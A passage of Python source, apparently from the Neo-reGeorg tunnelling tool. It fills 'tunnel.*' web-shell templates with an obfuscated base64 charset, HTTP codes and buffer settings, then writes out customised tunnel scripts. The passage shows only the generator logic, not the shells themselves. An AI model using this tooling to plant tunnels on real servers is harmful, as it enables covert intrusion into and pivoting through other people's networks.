            use_request_template = 1
            request_template_start_index = len(request_template[0])
            request_template_end_index = len(request_template[1])
        else:
            use_request_template = 0

        for filename in os.listdir(script_dir):
            outfile = os.path.join(outdir, filename)
            filepath = os.path.join(script_dir, filename)
            if os.path.isfile(filepath) and filename.startswith('tunnel.'):
                text = file_read(filepath)
                text = text.replace(r"NeoGeorg says, 'All seems fine'", neoreg_hello)
                text = re.sub(r"BASE64 CHARSLIST", M_BASE64CHARS, text)
                text = re.sub(r"\bHTTPCODE\b", str(args.httpcode), text)
                text = re.sub(r"\bREADBUF\b", str(READBUF), text)
                text = re.sub(r"\bMAXREADSIZE\b", str(MAXREADSIZE), text)

                # request template
                text = re.sub(r"USE_REQUEST_TEMPLATE", str(use_request_template), text)
                text = re.sub(r"START_INDEX", str(request_template_start_index), text)
                text = re.sub(r"END_INDEX", str(request_template_end_index), text)

                # fix subn bug
                text = re.sub(r"\bBLV_L_OFFSET\b", str(BLV_L_OFFSET), text)
                text = re.sub(r"\bBLV_L_OFFSET\b", str(BLV_L_OFFSET), text)

                # only jsp/csharp
                text = re.sub(r"\bBLVHEAD_LEN\b", str(BLVHEAD_LEN), text)

                # only jsp
                text = re.sub(r"BASE64 ARRAYLIST", ','.join(map(str, M_BASE64ARRAY)), text)

                file_write(outfile, text)
                print("       => %s/%s" % (outdir, os.path.basename(outfile)))

        print('')
